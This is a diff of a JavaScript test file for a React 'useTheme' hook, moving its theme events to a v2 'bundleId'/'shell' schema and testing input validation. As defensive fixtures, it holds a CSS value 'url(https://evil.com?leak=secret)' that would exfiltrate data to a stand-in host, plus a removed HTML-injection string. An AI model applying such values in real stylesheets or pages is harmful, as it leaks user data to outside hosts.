@@ -17,56 +17,65 @@ function makeBridge() {
 }
 
 beforeEach(() => {
-  document.documentElement.removeAttribute("data-theme");
-  document.documentElement.removeAttribute("data-chat-theme");
-  document.documentElement.removeAttribute("data-code-theme");
+  document.documentElement.removeAttribute("data-theme-bundle");
+  document.documentElement.removeAttribute("data-shell");
   document.documentElement.style.cssText = "";
 });
 
-describe("useTheme", () => {
+describe("useTheme v2", () => {
   it("subscribes to host.theme.changed", () => {
     const bridge = makeBridge();
     renderHook(() => useTheme(bridge));
     expect(bridge.onEvent).toHaveBeenCalledWith("host.theme.changed", expect.any(Function));
   });
 
-  it("sets data-theme on event", () => {
+  it("sets data-theme-bundle on event", () => {
     const bridge = makeBridge();
     renderHook(() => useTheme(bridge));
-    bridge.fire({ theme: "light", chatTheme: "default", codeTheme: "light" });
-    expect(document.documentElement.getAttribute("data-theme")).toBe("light");
+    bridge.fire({ bundleId: "tokyo-night", shell: "dark" });
+    expect(document.documentElement.getAttribute("data-theme-bundle")).toBe("tokyo-night");
   });
 
-  it("sets data-chat-theme for non-default value", () => {
+  it("sets data-shell on event", () => {
     const bridge = makeBridge();
     renderHook(() => useTheme(bridge));
-    bridge.fire({ theme: "dark", chatTheme: "purple", codeTheme: "dark" });
-    expect(document.documentElement.getAttribute("data-chat-theme")).toBe("purple");
+    bridge.fire({ bundleId: "lge-light", shell: "light" });
+    expect(document.documentElement.getAttribute("data-shell")).toBe("light");
   });
 
-  it("removes data-chat-theme when chatTheme is 'default'", () => {
-    document.documentElement.setAttribute("data-chat-theme", "purple");
-    const bridge = makeBridge();
-    renderHook(() => useTheme(bridge));
-    bridge.fire({ theme: "dark", chatTheme: "default", codeTheme: "dark" });
-    expect(document.documentElement.hasAttribute("data-chat-theme")).toBe(false);
+  it("accepts all valid bundleIds", () => {
+    const validIds = ["tokyo-night", "midnight", "forest", "lge-light", "lge-dark", "high-contrast"];
+    for (const bundleId of validIds) {
+      document.documentElement.removeAttribute("data-theme-bundle");
+      const bridge = makeBridge();
+      renderHook(() => useTheme(bridge));
+      bridge.fire({ bundleId, shell: "dark" });
+      expect(document.documentElement.getAttribute("data-theme-bundle")).toBe(bundleId);
+    }
   });
 
-  it("sets data-code-theme", () => {
+  it("rejects invalid bundleId — does not set data-theme-bundle", () => {
     const bridge = makeBridge();
     renderHook(() => useTheme(bridge));
-    bridge.fire({ theme: "dark", chatTheme: "default", codeTheme: "light" });
-    expect(document.documentElement.getAttribute("data-code-theme")).toBe("light");
+    bridge.fire({ bundleId: "legacy-dark", shell: "dark" });
+    expect(document.documentElement.hasAttribute("data-theme-bundle")).toBe(false);
+  });
+
+  it("rejects invalid shell value — does not set data-shell", () => {
+    const bridge = makeBridge();
+    renderHook(() => useTheme(bridge));
+    bridge.fire({ bundleId: "midnight", shell: "high-contrast" });
+    expect(document.documentElement.hasAttribute("data-shell")).toBe(false);
   });
 
   it("applies only --lvis-* tokens, drops non-prefixed keys", () => {
     const bridge = makeBridge();
     renderHook(() => useTheme(bridge));
     bridge.fire({
-      theme: "light", chatTheme: "default", codeTheme: "light",
-      tokens: { "--lvis-bg": "#ffffff", "--evil-key": "bad", "color": "red" },
+      bundleId: "tokyo-night", shell: "dark",
+      tokens: { "--lvis-bg": "#1a1b26", "--evil-key": "bad", "color": "red" },
     });
-    expect(document.documentElement.style.getPropertyValue("--lvis-bg")).toBe("#ffffff");
+    expect(document.documentElement.style.getPropertyValue("--lvis-bg")).toBe("#1a1b26");
     expect(document.documentElement.style.getPropertyValue("--evil-key")).toBe("");
   });
 
@@ -74,32 +83,18 @@ describe("useTheme", () => {
     const bridge = makeBridge();
     renderHook(() => useTheme(bridge));
     bridge.fire({
-      theme: "dark", chatTheme: "default", codeTheme: "dark",
+      bundleId: "midnight", shell: "dark",
       tokens: { "--lvis-bg": "#000", "--lvis-nonexistent-custom": "red" },
     });
     expect(document.documentElement.style.getPropertyValue("--lvis-bg")).toBe("#000");
     expect(document.documentElement.style.getPropertyValue("--lvis-nonexistent-custom")).toBe("");
   });
 
-  it("rejects invalid theme enum — does not set data-theme", () => {
-    const bridge = makeBridge();
-    renderHook(() => useTheme(bridge));
-    bridge.fire({ theme: "hacker", chatTheme: "default", codeTheme: "light" });
-    expect(document.documentElement.hasAttribute("data-theme")).toBe(false);
-  });
-
-  it("rejects invalid chatTheme enum — does not set data-chat-theme", () => {
-    const bridge = makeBridge();
-    renderHook(() => useTheme(bridge));
-    bridge.fire({ theme: "dark", chatTheme: '"><img src=x>', codeTheme: "dark" });
-    expect(document.documentElement.hasAttribute("data-chat-theme")).toBe(false);
-  });
-
   it("rejects unsafe token values (url injection)", () => {
     const bridge = makeBridge();
     renderHook(() => useTheme(bridge));
     bridge.fire({
-      theme: "dark", chatTheme: "default", codeTheme: "dark",
+      bundleId: "forest", shell: "dark",
       tokens: { "--lvis-bg": "url(https://evil.com?leak=secret)" },
     });
     expect(document.documentElement.style.getPropertyValue("--lvis-bg")).toBe("");
@@ -116,5 +111,27 @@ describe("useTheme", () => {
     const { unmount } = renderHook(() => useTheme(bridge));
     unmount();
     expect(bridge.unsub).toHaveBeenCalledTimes(1);
+  });
+
+  // Regression: v1 fields must NOT be present — validate they have no effect
+  it("does not set legacy data-theme attribute (v1 field removed)", () => {
+    const bridge = makeBridge();
+    renderHook(() => useTheme(bridge));
+    bridge.fire({ bundleId: "lge-dark", shell: "dark" });
+    expect(document.documentElement.hasAttribute("data-theme")).toBe(false);
+  });
+
+  it("does not set legacy data-chat-theme attribute (v1 field removed)", () => {
+    const bridge = makeBridge();
+    renderHook(() => useTheme(bridge));
+    bridge.fire({ bundleId: "lge-dark", shell: "dark" });
+    expect(document.documentElement.hasAttribute("data-chat-theme")).toBe(false);
+  });
+
+  it("does not set legacy data-code-theme attribute (v1 field removed)", () => {
+    const bridge = makeBridge();
+    renderHook(() => useTheme(bridge));
+    bridge.fire({ bundleId: "lge-dark", shell: "dark" });
+    expect(document.documentElement.hasAttribute("data-code-theme")).toBe(false);
   });
 });
